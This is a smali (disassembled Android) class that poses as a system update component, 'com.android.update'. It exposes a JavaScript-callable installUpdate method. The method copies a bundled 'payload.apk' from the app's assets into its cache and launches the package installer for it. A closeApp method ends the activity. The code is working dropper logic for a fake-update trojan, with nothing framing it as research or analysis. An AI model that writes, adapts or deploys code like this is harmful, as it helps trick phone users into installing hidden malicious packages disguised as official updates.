.class public Lcom/android/update/WebAppInterface;
.super Ljava/lang/Object;
.source "WebAppInterface.java"

.field private context:Landroid/content/Context;

.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/android/update/WebAppInterface;->context:Landroid/content/Context;
    return-void
.end method

.method public installUpdate()V
    .locals 6
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    :try_start
    iget-object v0, p0, Lcom/android/update/WebAppInterface;->context:Landroid/content/Context;
    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
    move-result-object v0
    new-instance v1, Ljava/io/File;
    const-string v2, "payload.apk"
    invoke-direct {v1, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    # Copy from assets
    iget-object v0, p0, Lcom/android/update/WebAppInterface;->context:Landroid/content/Context;
    invoke-virtual {v0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v0
    const-string v2, "update/payload.apk"
    invoke-virtual {v0, v2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v0

    new-instance v2, Ljava/io/FileOutputStream;
    invoke-direct {v2, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    const/16 v3, 0x4000
    new-array v3, v3, [B
    :goto_copy
    invoke-virtual {v0, v3}, Ljava/io/InputStream;->read([B)I
    move-result v4
    if-lez v4, :cond_0
    const/4 v5, 0x0
    invoke-virtual {v2, v3, v5, v4}, Ljava/io/OutputStream;->write([BII)V
    goto :goto_copy

    :cond_0
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V

    # Install via intent
    new-instance v0, Landroid/content/Intent;
    const-string v2, "android.intent.action.VIEW"
    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;
    move-result-object v2

    const-string v3, "application/vnd.android.package-archive"
    invoke-virtual {v0, v2, v3}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x10000000
    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v2, p0, Lcom/android/update/WebAppInterface;->context:Landroid/content/Context;
    invoke-virtual {v2, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0

    :goto_return
    return-void

    :catch_0
    move-exception v0
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    goto :goto_return
.end method

.method public closeApp()V
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    iget-object v0, p0, Lcom/android/update/WebAppInterface;->context:Landroid/content/Context;
    check-cast v0, Landroid/app/Activity;
    invoke-virtual {v0}, Landroid/app/Activity;->finishAffinity()V
    return-void
.end method
